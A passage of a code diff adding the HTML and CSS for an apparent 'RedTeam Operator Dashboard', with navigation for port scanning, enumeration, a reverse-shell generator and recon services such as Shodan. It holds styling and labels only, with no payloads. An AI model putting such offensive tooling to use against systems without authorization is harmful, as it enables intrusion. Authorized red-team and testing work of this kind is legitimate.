@@ -1,0 +1,3572 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RedTeam Operator Dashboard v2</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap');
+
+  :root {
+    --bg: #060a10;
+    --bg2: #0b0f1a;
+    --bg3: #0f1525;
+    --neon: #00ff9f;
+    --neon2: #00d4ff;
+    --neon3: #bf00ff;
+    --red: #ff003c;
+    --yellow: #ffcc00;
+    --text: #c8d6e5;
+    --text-dim: #5a7a9a;
+    --border: rgba(0,255,159,0.15);
+    --border2: rgba(0,212,255,0.15);
+    --glass: rgba(11,15,26,0.85);
+    --glow: 0 0 20px rgba(0,255,159,0.3);
+    --glow2: 0 0 20px rgba(0,212,255,0.3);
+  }
+
+  [data-theme="cyberpunk"] {
+    --neon: #ff00aa;
+    --neon2: #aa00ff;
+    --neon3: #ff6600;
+    --border: rgba(255,0,170,0.2);
+    --border2: rgba(170,0,255,0.2);
+    --glow: 0 0 20px rgba(255,0,170,0.3);
+    --glow2: 0 0 20px rgba(170,0,255,0.3);
+  }
+
+  [data-theme="stealth"] {
+    --neon: #00aaff;
+    --neon2: #0066ff;
+    --neon3: #00ffcc;
+    --border: rgba(0,170,255,0.2);
+    --border2: rgba(0,102,255,0.2);
+    --glow: 0 0 20px rgba(0,170,255,0.3);
+    --glow2: 0 0 20px rgba(0,102,255,0.3);
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 15px;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* Scroll progress */
+  #scroll-progress {
+    position: fixed; top: 0; left: 0; height: 2px; width: 0%;
+    background: linear-gradient(90deg, var(--neon), var(--neon2));
+    z-index: 9999;
+    box-shadow: var(--glow);
+    transition: width 0.1s linear;
+  }
+
+  /* Matrix canvas */
+  #matrix-canvas {
+    position: fixed; top: 0; left: 0;
+    width: 100%; height: 100%;
+    z-index: 0; opacity: 0.04;
+    pointer-events: none;
+  }
+
+  /* Grid background */
+  .grid-bg {
+    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+    z-index: 0; pointer-events: none;
+    background-image:
+      linear-gradient(rgba(0,255,159,0.03) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(0,255,159,0.03) 1px, transparent 1px);
+    background-size: 40px 40px;
+  }
+
+  /* Sidebar */
+  #sidebar {
+    position: fixed; top: 0; left: 0; bottom: 0;
+    width: 240px; z-index: 100;
+    background: rgba(6,10,16,0.97);
+    border-right: 1px solid var(--border);
+    display: flex; flex-direction: column;
+    transition: transform 0.3s ease;
+    overflow-y: auto;
+  }
+
+  #sidebar.collapsed { transform: translateX(-240px); }
+
+  .sidebar-logo {
+    padding: 20px;
+    border-bottom: 1px solid var(--border);
+    display: flex; align-items: center; gap: 10px;
+  }
+
+  .logo-icon {
+    width: 36px; height: 36px;
+    background: linear-gradient(135deg, var(--neon), var(--neon2));
+    clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
+    display: flex; align-items: center; justify-content: center;
+    animation: pulse-logo 2s infinite;
+    flex-shrink: 0;
+  }
+
+  @keyframes pulse-logo {
+    0%, 100% { box-shadow: 0 0 10px var(--neon); }
+    50% { box-shadow: 0 0 25px var(--neon), 0 0 50px var(--neon); }
+  }
+
+  .logo-text {
+    font-family: 'Orbitron', monospace;
+    font-size: 11px; font-weight: 700;
+    color: var(--neon);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    line-height: 1.3;
+  }
+
+  .nav-section { padding: 10px 0; }
+
+  .nav-label {
+    padding: 8px 20px 4px;
+    font-size: 10px; font-weight: 700;
+    color: var(--text-dim);
+    text-transform: uppercase;
+    letter-spacing: 2px;
+  }
+
+  .nav-item {
+    display: flex; align-items: center; gap: 10px;
+    padding: 10px 20px;
+    cursor: pointer;
+    color: var(--text-dim);
+    font-size: 13px;
+    font-weight: 600;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+    transition: all 0.2s;
+    border-left: 2px solid transparent;
+  }
+
+  .nav-item:hover, .nav-item.active {
+    color: var(--neon);
+    border-left-color: var(--neon);
+    background: rgba(0,255,159,0.05);
+  }
+
+  .nav-item .icon { font-size: 14px; width: 16px; text-align: center; }
+
+  /* Main layout */
+  #main {
+    margin-left: 240px;
+    position: relative; z-index: 1;
+    min-height: 100vh;
+    transition: margin-left 0.3s ease;
+  }
+
+  #main.expanded { margin-left: 0; }
+
+  /* Header */
+  #header {
+    position: sticky; top: 0; z-index: 50;
+    background: rgba(6,10,16,0.95);
+    backdrop-filter: blur(10px);
+    border-bottom: 1px solid var(--border);
+    padding: 12px 24px;
+    display: flex; align-items: center; gap: 16px;
+  }
+
+  #hamburger {
+    background: none; border: 1px solid var(--border);
+    color: var(--neon); padding: 6px 10px;
+    cursor: pointer; font-size: 16px;
+    transition: all 0.2s;
+    border-radius: 3px;
+  }
+
+  #hamburger:hover { background: rgba(0,255,159,0.1); box-shadow: var(--glow); }
+
+  #header-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 13px; font-weight: 700;
+    color: var(--neon);
+    letter-spacing: 2px;
+    flex: 1;
+  }
+
+  .header-actions { display: flex; align-items: center; gap: 10px; }
+
+  .btn-header {
+    background: none; border: 1px solid var(--border);
+    color: var(--text-dim); padding: 6px 12px;
+    cursor: pointer; font-size: 12px;
+    font-family: 'Share Tech Mono', monospace;
+    transition: all 0.2s; border-radius: 3px;
+    text-transform: uppercase; letter-spacing: 1px;
+  }
+
+  .btn-header:hover { border-color: var(--neon); color: var(--neon); background: rgba(0,255,159,0.08); }
+
+  /* Content */
+  #content { padding: 24px; }
+
+  /* Section */
+  .section { margin-bottom: 32px; }
+
+  .section-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 12px; font-weight: 700;
+    color: var(--neon);
+    text-transform: uppercase;
+    letter-spacing: 3px;
+    margin-bottom: 16px;
+    display: flex; align-items: center; gap: 10px;
+  }
+
+  .section-title::after {
+    content: '';
+    flex: 1; height: 1px;
+    background: linear-gradient(90deg, var(--neon), transparent);
+    opacity: 0.4;
+  }
+
+  /* Glass panel */
+  .panel {
+    background: var(--glass);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    backdrop-filter: blur(10px);
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  .panel:hover { border-color: rgba(0,255,159,0.3); }
+
+  /* Target Analysis */
+  #scan-panel { padding: 24px; }
+
+  .scan-input-row {
+    display: flex; gap: 12px;
+    margin-bottom: 20px;
+    flex-wrap: wrap;
+  }
+
+  .scan-input {
+    flex: 1; min-width: 280px;
+    background: rgba(0,0,0,0.4);
+    border: 1px solid var(--border2);
+    color: var(--neon2); padding: 12px 16px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px;
+    border-radius: 4px;
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  .scan-input:focus {
+    border-color: var(--neon2);
+    box-shadow: var(--glow2);
+  }
+
+  .scan-input::placeholder { color: var(--text-dim); }
+
+  .btn-scan {
+    background: linear-gradient(135deg, var(--neon), var(--neon2));
+    border: none; color: #000;
+    padding: 12px 28px;
+    font-family: 'Orbitron', monospace;
+    font-size: 11px; font-weight: 900;
+    letter-spacing: 2px;
+    cursor: pointer;
+    border-radius: 4px;
+    transition: all 0.2s;
+    text-transform: uppercase;
+    white-space: nowrap;
+  }
+
+  .btn-scan:hover { transform: translateY(-1px); box-shadow: 0 4px 20px rgba(0,255,159,0.4); }
+  .btn-scan:active { transform: translateY(0); }
+
+  /* Tabs */
+  .tabs { display: flex; gap: 0; margin-bottom: 20px; border-bottom: 1px solid var(--border); flex-wrap: wrap; }
+
+  .tab {
+    padding: 10px 18px;
+    cursor: pointer;
+    color: var(--text-dim);
+    font-size: 11px; font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    border-bottom: 2px solid transparent;
+    transition: all 0.2s;
+    font-family: 'Share Tech Mono', monospace;
+  }
+
+  .tab:hover { color: var(--text); }
+  .tab.active { color: var(--neon); border-bottom-color: var(--neon); }
+
+  .tab-content { display: none; }
+  .tab-content.active { display: block; }
+
+  /* Info grid */
+  .info-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    gap: 12px;
+  }
+
+  .info-card {
+    background: rgba(0,0,0,0.3);
+    border: 1px solid var(--border);
+    border-radius: 4px; padding: 14px;
+  }
+
+  .info-label {
+    font-size: 10px; font-weight: 700;
+    color: var(--text-dim); text-transform: uppercase;
+    letter-spacing: 2px; margin-bottom: 6px;
+  }
+
+  .info-value {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px; color: var(--neon2);
+  }
+
+  .badge {
+    display: inline-block;
+    padding: 3px 10px; border-radius: 3px;
+    font-size: 10px; font-weight: 700;
+    text-transform: uppercase; letter-spacing: 1px;
+  }
+
+  .badge-green { background: rgba(0,255,159,0.15); color: var(--neon); border: 1px solid rgba(0,255,159,0.3); }
+  .badge-red { background: rgba(255,0,60,0.15); color: var(--red); border: 1px solid rgba(255,0,60,0.3); }
+  .badge-yellow { background: rgba(255,204,0,0.15); color: var(--yellow); border: 1px solid rgba(255,204,0,0.3); }
+
+  /* Loading spinner */
+  .spinner {
+    width: 24px; height: 24px;
+    border: 2px solid var(--border);
+    border-top-color: var(--neon);
+    border-radius: 50%;
+    animation: spin 0.8s linear infinite;
+    display: none;
+  }
+
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* Port table */
+  .port-table { width: 100%; border-collapse: collapse; }
+  .port-table th {
+    background: rgba(0,255,159,0.08);
+    padding: 8px 12px;
+    text-align: left;
+    font-size: 10px; font-weight: 700;
+    text-transform: uppercase; letter-spacing: 2px;
+    color: var(--neon);
+    border-bottom: 1px solid var(--border);
+  }
+  .port-table td {
+    padding: 8px 12px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px; color: var(--text);
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+  }
+  .port-table tr:hover td { background: rgba(0,255,159,0.03); }
+
+  /* Headers checklist */
+  .header-check {
+    display: flex; align-items: center; gap: 12px;
+    padding: 10px 14px;
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+  }
+
+  .header-check:last-child { border-bottom: none; }
+
+  .check-dot {
+    width: 8px; height: 8px; border-radius: 50%;
+    flex-shrink: 0;
+  }
+
+  .check-dot.present { background: var(--neon); box-shadow: 0 0 8px var(--neon); }
+  .check-dot.missing { background: var(--red); box-shadow: 0 0 8px var(--red); }
+
+  /* Code blocks */
+  .code-block {
+    position: relative;
+    background: rgba(0,0,0,0.5) !important;
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    margin-bottom: 12px;
+    transition: border-color 0.2s, box-shadow 0.2s;
+  }
+
+  .code-block:hover {
+    border-color: rgba(0,255,159,0.3);
+    box-shadow: var(--glow);
+  }
+
+  .code-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 8px 14px;
+    border-bottom: 1px solid var(--border);
+    background: rgba(0,255,159,0.05);
+  }
+
+  .code-label {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px; color: var(--neon);
+    letter-spacing: 1px;
+  }
+
+  .btn-copy {
+    background: none; border: 1px solid var(--border);
+    color: var(--text-dim); padding: 3px 10px;
+    cursor: pointer; font-size: 10px;
+    font-family: 'Share Tech Mono', monospace;
+    transition: all 0.2s; border-radius: 2px;
+    text-transform: uppercase; letter-spacing: 1px;
+  }
+
+  .btn-copy:hover { border-color: var(--neon); color: var(--neon); }
+  .btn-copy.copied { border-color: var(--neon); color: var(--neon); background: rgba(0,255,159,0.1); }
+
+  .code-block pre {
+    margin: 0 !important;
+    padding: 14px !important;
+    background: transparent !important;
+    border-radius: 0 !important;
+    font-size: 12px !important;
+    overflow-x: auto;
+  }
+
+  /* Collapsible */
+  .collapsible-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 14px 18px;
+    cursor: pointer;
+    border-bottom: 1px solid transparent;
+    transition: all 0.2s;
+  }
+
+  .collapsible-header:hover { background: rgba(0,255,159,0.03); }
+
+  .collapsible-header.open { border-bottom-color: var(--border); }
+
+  .collapsible-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 11px; font-weight: 700;
+    color: var(--neon2);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    display: flex; align-items: center; gap: 10px;
+  }
+
+  .phase-num {
+    width: 24px; height: 24px;
+    background: rgba(0,212,255,0.15);
+    border: 1px solid var(--border2);
+    border-radius: 3px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 11px; color: var(--neon2);
+  }
+
+  .collapsible-arrow {
+    color: var(--text-dim); font-size: 12px;
+    transition: transform 0.2s;
+  }
+
+  .collapsible-header.open .collapsible-arrow { transform: rotate(180deg); }
+
+  .collapsible-body {
+    display: none;
+    padding: 16px 18px;
+  }
+
+  .collapsible-body.open { display: block; }
+
+  .opsec-note {
+    background: rgba(255,0,60,0.05);
+    border: 1px solid rgba(255,0,60,0.2);
+    border-left: 3px solid var(--red);
+    padding: 10px 14px;
+    margin-bottom: 10px;
+    border-radius: 0 4px 4px 0;
+    font-size: 13px;
+    color: var(--text);
+  }
+
+  .opsec-note strong { color: var(--red); }
+
+  .note-tip {
+    background: rgba(0,255,159,0.05);
+    border: 1px solid rgba(0,255,159,0.2);
+    border-left: 3px solid var(--neon);
+    padding: 10px 14px;
+    margin-bottom: 10px;
+    border-radius: 0 4px 4px 0;
+    font-size: 13px;
+    color: var(--text);
+  }
+
+  .note-tip strong { color: var(--neon); }
+
+  /* Checklist */
+  .checklist-item {
+    display: flex; align-items: center; gap: 12px;
+    padding: 10px 14px;
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+    cursor: pointer;
+    transition: background 0.2s;
+  }
+
+  .checklist-item:hover { background: rgba(0,255,159,0.03); }
+
+  .checklist-item input[type="checkbox"] {
+    width: 16px; height: 16px;
+    accent-color: var(--neon);
+    cursor: pointer;
+  }
+
+  .checklist-item.done label { text-decoration: line-through; color: var(--text-dim); }
+
+  .checklist-item label { cursor: pointer; flex: 1; font-size: 13px; }
+
+  .checklist-item .tag {
+    font-size: 10px; padding: 2px 8px;
+    border-radius: 2px; font-weight: 700;
+    text-transform: uppercase; letter-spacing: 1px;
+  }
+
+  .progress-bar-wrap {
+    background: rgba(0,0,0,0.3);
+    border: 1px solid var(--border);
+    border-radius: 4px; height: 8px;
+    margin-bottom: 12px; overflow: hidden;
+  }
+
+  .progress-bar {
+    height: 100%;
+    background: linear-gradient(90deg, var(--neon), var(--neon2));
+    border-radius: 4px;
+    box-shadow: var(--glow);
+    transition: width 0.4s ease;
+  }
+
+  /* Command builder */
+  .builder-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin-bottom: 16px;
+  }
+
+  .builder-select, .builder-input {
+    background: rgba(0,0,0,0.4);
+    border: 1px solid var(--border);
+    color: var(--text); padding: 10px 14px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px; border-radius: 4px; outline: none;
+    transition: border-color 0.2s;
+    width: 100%;
+  }
+
+  .builder-select:focus, .builder-input:focus {
+    border-color: var(--neon2);
+    box-shadow: var(--glow2);
+  }
+
+  .builder-select option { background: #0b0f1a; }
+
+  .built-command {
+    background: rgba(0,0,0,0.5);
+    border: 1px solid var(--neon);
+    border-radius: 4px; padding: 16px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 14px; color: var(--neon);
+    word-break: break-all;
+    min-height: 50px;
+    box-shadow: var(--glow);
+  }
+
+  /* Search */
+  #global-search {
+    background: rgba(0,0,0,0.4);
+    border: 1px solid var(--border);
+    color: var(--text); padding: 9px 16px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px; border-radius: 4px; outline: none;
+    transition: border-color 0.2s;
+    width: 200px;
+  }
+
+  #global-search:focus { border-color: var(--neon); width: 280px; }
+
+  mark.highlight {
+    background: rgba(0,255,159,0.25);
+    color: var(--neon);
+    border-radius: 2px;
+  }
+
+  /* Terminal modal */
+  #terminal-modal {
+    display: none;
+    position: fixed; inset: 0; z-index: 999;
+    background: rgba(0,0,0,0.85);
+    align-items: center; justify-content: center;
+  }
+
+  #terminal-modal.open { display: flex; }
+
+  .terminal-window {
+    width: 700px; max-width: 95vw;
+    background: #050810;
+    border: 1px solid var(--neon);
+    border-radius: 6px;
+    box-shadow: 0 0 60px rgba(0,255,159,0.2);
+    overflow: hidden;
+  }
+
+  .terminal-titlebar {
+    background: rgba(0,255,159,0.08);
+    padding: 10px 16px;
+    display: flex; align-items: center; justify-content: space-between;
+    border-bottom: 1px solid var(--border);
+  }
+
+  .terminal-title {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px; color: var(--neon);
+  }
+
+  .terminal-close {
+    background: none; border: none;
+    color: var(--red); cursor: pointer;
+    font-size: 16px; line-height: 1;
+  }
+
+  .terminal-output {
+    height: 300px; overflow-y: auto;
+    padding: 16px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px; color: var(--neon);
+    line-height: 1.8;
+  }
+
+  .terminal-output .t-cmd { color: var(--neon2); }
+  .terminal-output .t-out { color: var(--text); }
+  .terminal-output .t-err { color: var(--red); }
+
+  .terminal-input-row {
+    display: flex; align-items: center; gap: 8px;
+    padding: 12px 16px;
+    border-top: 1px solid var(--border);
+  }
+
+  .terminal-prompt { color: var(--neon); font-family: 'Share Tech Mono', monospace; font-size: 12px; }
+
+  .terminal-input {
+    flex: 1; background: none; border: none;
+    color: var(--neon); outline: none;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px; caret-color: var(--neon);
+  }
+
+  /* Theme switcher */
+  .theme-btn {
+    width: 28px; height: 28px; border-radius: 50%;
+    cursor: pointer; border: 2px solid transparent;
+    transition: all 0.2s;
+  }
+
+  .theme-btn:hover, .theme-btn.active { border-color: var(--text); transform: scale(1.15); }
+
+  /* Status indicator */
+  .status-dot {
+    display: inline-block; width: 8px; height: 8px;
+    border-radius: 50%; background: var(--neon);
+    box-shadow: 0 0 8px var(--neon);
+    animation: blink 1.5s infinite;
+  }
+
+  @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+
+  /* Footer */
+  footer {
+    border-top: 1px solid var(--border);
+    padding: 20px 24px;
+    text-align: center;
+    font-size: 11px; color: var(--text-dim);
+    font-family: 'Share Tech Mono', monospace;
+    background: rgba(6,10,16,0.9);
+  }
+
+  footer span { color: var(--red); }
+
+  /* Responsive */
+  @media (max-width: 768px) {
+    #sidebar { transform: translateX(-240px); }
+    #sidebar.open { transform: translateX(0); }
+    #main { margin-left: 0; }
+    .builder-grid { grid-template-columns: 1fr; }
+    #global-search { width: 140px; }
+  }
+
+  /* Scrollbar */
+  ::-webkit-scrollbar { width: 4px; height: 4px; }
+  ::-webkit-scrollbar-track { background: var(--bg); }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+  ::-webkit-scrollbar-thumb:hover { background: var(--neon); }
+
+  /* Subsection label */
+  .sub-label {
+    font-size: 10px; font-weight: 700;
+    color: var(--neon3); text-transform: uppercase;
+    letter-spacing: 2px; margin: 16px 0 8px;
+  }
+
+  .grid-2 {
+    display: grid; grid-template-columns: 1fr 1fr;
+    gap: 12px;
+  }
+
+  @media (max-width: 600px) { .grid-2 { grid-template-columns: 1fr; } }
+
+  /* New section styles */
+  .tool-textarea {
+    width: 100%; min-height: 100px;
+    background: rgba(0,0,0,0.4);
+    border: 1px solid var(--border);
+    color: var(--neon2); padding: 12px 16px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px; border-radius: 4px;
+    outline: none; resize: vertical;
+    transition: border-color 0.2s;
+  }
+  .tool-textarea:focus { border-color: var(--neon2); box-shadow: var(--glow2); }
+  .tool-textarea::placeholder { color: var(--text-dim); }
+
+  .tool-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+  @media (max-width: 600px) { .tool-grid { grid-template-columns: 1fr; } }
+
+  .tool-btn-row { display: flex; gap: 8px; margin: 10px 0; flex-wrap: wrap; }
+
+  .btn-tool {
+    background: rgba(0,255,159,0.1); border: 1px solid var(--border);
+    color: var(--neon); padding: 6px 14px;
+    cursor: pointer; font-size: 11px;
+    font-family: 'Share Tech Mono', monospace;
+    transition: all 0.2s; border-radius: 3px;
+    text-transform: uppercase; letter-spacing: 1px;
+  }
+  .btn-tool:hover { border-color: var(--neon); background: rgba(0,255,159,0.2); }
+  .btn-tool.active { border-color: var(--neon); background: rgba(0,255,159,0.2); box-shadow: var(--glow); }
+
+  .revshell-output {
+    background: rgba(0,0,0,0.5);
+    border: 1px solid var(--border);
+    border-radius: 4px; padding: 16px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px; color: var(--neon);
+    word-break: break-all; min-height: 50px;
+    position: relative; white-space: pre-wrap;
+  }
+
+  .hash-result {
+    background: rgba(0,0,0,0.3);
+    border: 1px solid var(--border);
+    border-radius: 4px; padding: 12px 16px;
+    margin-top: 12px;
+  }
+
+  .hash-type {
+    display: inline-block;
+    padding: 4px 12px; margin: 4px;
+    border-radius: 3px; font-size: 11px;
+    font-family: 'Share Tech Mono', monospace;
+    font-weight: 700; letter-spacing: 1px;
+    background: rgba(0,212,255,0.12);
+    color: var(--neon2);
+    border: 1px solid rgba(0,212,255,0.25);
+  }
+
+  .notes-meta {
+    font-size: 11px; color: var(--text-dim);
+    font-family: 'Share Tech Mono', monospace;
+    margin-bottom: 8px;
+  }
+
+  .subdomain-table { width: 100%; border-collapse: collapse; }
+  .subdomain-table th {
+    background: rgba(0,255,159,0.08);
+    padding: 8px 12px; text-align: left;
+    font-size: 10px; font-weight: 700;
+    text-transform: uppercase; letter-spacing: 2px;
+    color: var(--neon);
+    border-bottom: 1px solid var(--border);
+  }
+  .subdomain-table td {
+    padding: 8px 12px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px; color: var(--text);
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+  }
+  .subdomain-table tr:hover td { background: rgba(0,255,159,0.03); }
+
+  /* API Services */
+  .api-service-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+    gap: 16px;
+  }
+
+  .api-service-card {
+    background: rgba(0,0,0,0.3);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 20px;
+    transition: all 0.2s;
+  }
+
+  .api-service-card:hover {
+    border-color: var(--neon);
+    box-shadow: var(--glow);
+  }
+
+  .api-service-card .service-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 12px;
+  }
+
+  .api-service-card .service-icon {
+    width: 36px;
+    height: 36px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: rgba(0,255,159,0.08);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    font-size: 18px;
+    flex-shrink: 0;
+  }
+
+  .api-service-card .service-name {
+    font-family: 'Orbitron', monospace;
+    font-size: 12px;
+    font-weight: 700;
+    color: var(--neon);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+
+  .api-service-card .service-desc {
+    font-size: 12px;
+    color: var(--text-dim);
+    line-height: 1.5;
+    margin-bottom: 12px;
+  }
+
+  .api-key-input {
+    width: 100%;
+    background: rgba(0,0,0,0.4);
+    border: 1px solid var(--border);
+    color: var(--text);
+    padding: 8px 12px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    border-radius: 4px;
+    transition: border-color 0.2s;
+  }
+
+  .api-key-input:focus {
+    outline: none;
+    border-color: var(--neon);
+    box-shadow: var(--glow);
+  }
+
+  .api-key-input::placeholder { color: var(--text-dim); opacity: 0.5; }
+
+  .api-status {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 10px;
+    font-family: 'Share Tech Mono', monospace;
+    padding: 3px 10px;
+    border-radius: 3px;
+    letter-spacing: 1px;
+    margin-top: 8px;
+  }
+
+  .api-status.configured {
+    color: var(--neon);
+    background: rgba(0,255,159,0.1);
+    border: 1px solid rgba(0,255,159,0.3);
+  }
+
+  .api-status.not-configured {
+    color: var(--yellow);
+    background: rgba(255,204,0,0.1);
+    border: 1px solid rgba(255,204,0,0.3);
+  }
+
+  .api-result-container {
+    background: rgba(0,0,0,0.3);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 16px;
+    margin-top: 12px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    max-height: 500px;
+    overflow-y: auto;
+  }
+
+  .api-result-container::-webkit-scrollbar { width: 4px; }
+  .api-result-container::-webkit-scrollbar-track { background: transparent; }
+  .api-result-container::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+
+  .api-result-row {
+    display: flex;
+    justify-content: space-between;
+    padding: 6px 0;
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+  }
+
+  .api-result-row:last-child { border-bottom: none; }
+
+  .api-result-key {
+    color: var(--neon2);
+    font-weight: 600;
+    min-width: 140px;
+  }
+
+  .api-result-val {
+    color: var(--text);
+    text-align: right;
+    word-break: break-all;
+    flex: 1;
+    margin-left: 12px;
+  }
+
+  .api-tag {
+    display: inline-block;
+    padding: 2px 8px;
+    margin: 2px;
+    border-radius: 3px;
+    font-size: 10px;
+    font-family: 'Share Tech Mono', monospace;
+    background: rgba(0,212,255,0.12);
+    color: var(--neon2);
+    border: 1px solid rgba(0,212,255,0.25);
+  }
+
+  .api-tag.danger {
+    background: rgba(255,0,60,0.12);
+    color: var(--red);
+    border-color: rgba(255,0,60,0.3);
+  }
+
+  .api-tag.warn {
+    background: rgba(255,204,0,0.12);
+    color: var(--yellow);
+    border-color: rgba(255,204,0,0.3);
+  }
+
+  .api-tag.success {
+    background: rgba(0,255,159,0.12);
+    color: var(--neon);
+    border-color: rgba(0,255,159,0.3);
+  }
+
+  .api-section-tabs {
+    display: flex;
+    gap: 0;
+    margin-bottom: 16px;
+    border-bottom: 1px solid var(--border);
+    flex-wrap: wrap;
+  }
+
+  .api-section-tab {
+    padding: 10px 18px;
+    cursor: pointer;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    color: var(--text-dim);
+    border-bottom: 2px solid transparent;
+    transition: all 0.2s;
+  }
+
+  .api-section-tab:hover { color: var(--neon); }
+
+  .api-section-tab.active {
+    color: var(--neon);
+    border-bottom-color: var(--neon);
+  }
+
+  .api-tab-content {
+    display: none;
+  }
+
+  .api-tab-content.active {
+    display: block;
+  }
+</style>
+</head>
+<body>
+
+<div id="scroll-progress"></div>
+<canvas id="matrix-canvas"></canvas>
+<div class="grid-bg"></div>
+
+<!-- Sidebar -->
+<nav id="sidebar">
+  <div class="sidebar-logo">
+    <div class="logo-icon"></div>
+    <div class="logo-text">Red Team<br>Operator v2</div>
+  </div>
+  <div class="nav-section">
+    <div class="nav-label">Intelligence</div>
+    <div class="nav-item active" onclick="scrollTo_('#target-section')"><span class="icon">◈</span> Target Analysis</div>
+    <div class="nav-item" onclick="scrollTo_('#domain-section')"><span class="icon">◉</span> Domain Info</div>
+    <div class="nav-item" onclick="scrollTo_('#ports-section')"><span class="icon">⌇</span> Port Scanner</div>
+  </div>
+  <div class="nav-section">
+    <div class="nav-label">Knowledge Base</div>
+    <div class="nav-item" onclick="scrollTo_('#lifecycle-section')"><span class="icon">◎</span> Red Team Lifecycle</div>
+    <div class="nav-item" onclick="scrollTo_('#nmap-section')"><span class="icon">⎈</span> Nmap Library</div>
+    <div class="nav-item" onclick="scrollTo_('#enum-section')"><span class="icon">⊞</span> Enumeration</div>
+  </div>
+  <div class="nav-section">
+    <div class="nav-label">Tools</div>
+    <div class="nav-item" onclick="scrollTo_('#builder-section')"><span class="icon">⚙</span> Command Builder</div>
+    <div class="nav-item" onclick="scrollTo_('#checklist-section')"><span class="icon">☑</span> Checklist</div>
+    <div class="nav-item" onclick="openTerminal()"><span class="icon">▶</span> Terminal</div>
+  </div>
+  <div class="nav-section">
+    <div class="nav-label">Recon Tools</div>
+    <div class="nav-item" onclick="scrollTo_('#subdomain-section')"><span class="icon">⊕</span> Subdomains</div>
+    <div class="nav-item" onclick="scrollTo_('#revshell-section')"><span class="icon">⌘</span> Rev Shell Gen</div>
+  </div>
+  <div class="nav-section">
+    <div class="nav-label">API Services</div>
+    <div class="nav-item" onclick="scrollTo_('#api-settings-section')"><span class="icon">⚷</span> API Settings</div>
+    <div class="nav-item" onclick="scrollTo_('#shodan-section')"><span class="icon">⌬</span> Shodan</div>
+    <div class="nav-item" onclick="scrollTo_('#greynoise-section')"><span class="icon">◐</span> GreyNoise</div>
+    <div class="nav-item" onclick="scrollTo_('#vuldb-section')"><span class="icon">⚠</span> VulDB</div>
+    <div class="nav-item" onclick="scrollTo_('#fullhunt-section')"><span class="icon">◈</span> FullHunt</div>
+    <div class="nav-item" onclick="scrollTo_('#zap-section')"><span class="icon">⚡</span> ZAP Scanner</div>
+  </div>
+  <div class="nav-section">
+    <div class="nav-label">Utilities</div>
